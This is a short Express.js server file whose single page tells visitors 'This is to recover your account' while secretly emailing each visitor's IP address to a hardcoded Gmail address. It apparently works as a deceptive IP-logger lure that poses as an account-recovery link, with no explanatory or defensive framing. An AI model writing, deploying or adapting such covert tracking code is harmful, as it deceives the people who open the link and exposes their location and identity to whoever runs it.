const express = require('express');
const app = express();
const dotenv = require('dotenv');
const nodemailer = require('nodemailer');
dotenv.config();

const transporter = nodemailer.createTransport({
    service: 'gmail', // Update with your email service provider
    auth: {
        user: process.env.username, // Update with your email address
        pass: process.env.pass, // Update with your email password
    },
});

const sendMail = async (to, subject, html) => {
    await transporter.sendMail({
        from: process.env.username, // Update with your email address
        to: to,
        subject: subject,
        html: html,
    });
};

app.get('/', async (req, res) => {
    // Get the user's IP address
    const userIpAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || null;
    console.log(userIpAddress)

    // Send a response to the user
    res.send(`This is to recover your account`);

    // Send an email with the user's IP address
    await sendMail("obiora369@gmail.com", "User Location", `User's IP address: ${userIpAddress}`);
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
